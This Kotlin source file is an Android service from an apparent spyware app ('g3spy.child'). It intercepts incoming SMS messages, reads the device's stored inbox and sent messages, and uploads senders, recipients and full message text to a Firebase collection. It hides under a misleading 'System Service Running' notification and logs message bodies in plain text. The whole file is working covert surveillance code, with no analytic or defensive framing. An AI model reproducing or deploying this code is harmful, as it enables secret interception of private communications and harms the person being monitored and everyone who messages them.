package com.g3spy.child.services

import android.app.*
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.os.Binder
import android.os.IBinder
import android.provider.Telephony
import android.util.Log
import androidx.core.app.NotificationCompat
import com.g3spy.child.util.NotificationChannelManager
import com.google.firebase.Timestamp
import com.google.firebase.firestore.FirebaseFirestore
import java.util.*
import android.content.SharedPreferences

/**
 * Service that monitors incoming SMS messages and uploads them to Firebase
 */
class SmsService : Service() {
    companion object {
        private const val TAG = "SmsService"
        private const val NOTIFICATION_ID = 1002
        private const val CHANNEL_ID = "sms_channel"
        private const val CHANNEL_NAME = "SMS Tracker"
        private const val PREF_NAME = "SmsServicePrefs"
        private const val LAST_SMS_TIME_KEY = "last_sms_time"
    }
    
    private lateinit var firestore: FirebaseFirestore
    private lateinit var prefs: SharedPreferences
    private var smsReceiver: BroadcastReceiver? = null
    
    private val binder = LocalBinder()
    
    inner class LocalBinder : Binder() {
        fun getService(): SmsService = this@SmsService
    }
    
    override fun onCreate() {
        super.onCreate()
        
        firestore = FirebaseFirestore.getInstance()
        prefs = getSharedPreferences(PREF_NAME, Context.MODE_PRIVATE)
        
        // Create the notification channel
        NotificationChannelManager.createNotificationChannel(
            this,
            CHANNEL_ID,
            CHANNEL_NAME,
            NotificationManager.IMPORTANCE_LOW
        )
        
        // Register SMS receiver
        registerSmsReceiver()
        
        // Check for existing SMS messages
        checkExistingSmsMessages()
    }
    
    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Log.d(TAG, "SmsService started")
        
        // Create a notification for the foreground service
        val notification = createNotification()
        startForeground(NOTIFICATION_ID, notification)
        
        return START_STICKY
    }
    
    override fun onBind(intent: Intent?): IBinder {
        return binder
    }
    
    override fun onDestroy() {
        super.onDestroy()
        unregisterSmsReceiver()
    }
    
    private fun createNotification(): Notification {
        // Create an intent that will open the app when tapped
        val notificationIntent = Intent(this, this::class.java)
        val pendingIntent = PendingIntent.getActivity(
            this,
            0,
            notificationIntent,
            PendingIntent.FLAG_IMMUTABLE
        )
        
        // Build the notification
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("System Service Running")
            .setContentText("Maintaining system services...")
            .setSmallIcon(android.R.drawable.ic_dialog_email)
            .setContentIntent(pendingIntent)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .build()
    }
    
    private fun registerSmsReceiver() {
        if (smsReceiver == null) {
            val intentFilter = IntentFilter(Telephony.Sms.Intents.SMS_RECEIVED_ACTION)
            
            smsReceiver = object : BroadcastReceiver() {
                override fun onReceive(context: Context, intent: Intent) {
                    if (intent.action == Telephony.Sms.Intents.SMS_RECEIVED_ACTION) {
                        val messages = Telephony.Sms.Intents.getMessagesFromIntent(intent)
                        for (message in messages) {
                            val sender = message.displayOriginatingAddress
                            val body = message.displayMessageBody
                            val timestamp = System.currentTimeMillis()
                            
                            Log.d(TAG, "SMS received from $sender: $body")
                            uploadSmsToFirebase(sender, "ME", body, timestamp, true)
                        }
                    }
                }
            }
            
            registerReceiver(smsReceiver, intentFilter)
            Log.d(TAG, "SMS receiver registered")
        }
    }
    
    private fun unregisterSmsReceiver() {
        smsReceiver?.let {
            unregisterReceiver(it)
            smsReceiver = null
            Log.d(TAG, "SMS receiver unregistered")
        }
    }
    
    private fun checkExistingSmsMessages() {
        // Get the timestamp of the last processed SMS
        val lastSmsTime = prefs.getLong(LAST_SMS_TIME_KEY, 0L)
        
        // Query content provider for SMS messages
        val cursor = contentResolver.query(
            Telephony.Sms.CONTENT_URI,
            arrayOf(
                Telephony.Sms._ID,
                Telephony.Sms.ADDRESS,
                Telephony.Sms.BODY,
                Telephony.Sms.DATE,
                Telephony.Sms.TYPE
            ),
            "${Telephony.Sms.DATE} > ?",
            arrayOf(lastSmsTime.toString()),
            "${Telephony.Sms.DATE} DESC"
        )
        
        cursor?.use {
            if (it.moveToFirst()) {
                var mostRecentTimestamp = lastSmsTime
                
                do {
                    val addressIndex = it.getColumnIndex(Telephony.Sms.ADDRESS)
                    val bodyIndex = it.getColumnIndex(Telephony.Sms.BODY)
                    val dateIndex = it.getColumnIndex(Telephony.Sms.DATE)
                    val typeIndex = it.getColumnIndex(Telephony.Sms.TYPE)
                    
                    if (addressIndex >= 0 && bodyIndex >= 0 && dateIndex >= 0 && typeIndex >= 0) {
                        val address = it.getString(addressIndex)
                        val body = it.getString(bodyIndex)
                        val timestamp = it.getLong(dateIndex)
                        val type = it.getInt(typeIndex)
                        
                        // Update most recent timestamp if needed
                        if (timestamp > mostRecentTimestamp) {
                            mostRecentTimestamp = timestamp
                        }
                        
                        // Check if it's incoming or outgoing
                        val isIncoming = type == Telephony.Sms.MESSAGE_TYPE_INBOX
                        
                        // Set the sender and recipient based on the message type
                        val sender = if (isIncoming) address else "ME"
                        val recipient = if (isIncoming) "ME" else address
                        
                        Log.d(TAG, "Found SMS: $sender to $recipient: $body")
                        uploadSmsToFirebase(sender, recipient, body, timestamp, isIncoming)
                    }
                } while (it.moveToNext())
                
                // Update the last processed timestamp
                prefs.edit().putLong(LAST_SMS_TIME_KEY, mostRecentTimestamp).apply()
            }
        }
    }
    
    private fun uploadSmsToFirebase(
        sender: String,
        recipient: String,
        content: String,
        timestamp: Long,
        isIncoming: Boolean
    ) {
        val smsData = hashMapOf(
            "sender" to sender,
            "recipient" to recipient,
            "content" to content,
            "timestamp" to Timestamp(Date(timestamp)),
            "isIncoming" to isIncoming
        )
        
        firestore.collection("sms_messages")
            .add(smsData)
            .addOnSuccessListener { documentReference ->
                Log.d(TAG, "SMS uploaded with ID: ${documentReference.id}")
            }
            .addOnFailureListener { e ->
                Log.e(TAG, "Error uploading SMS", e)
            }
    }
}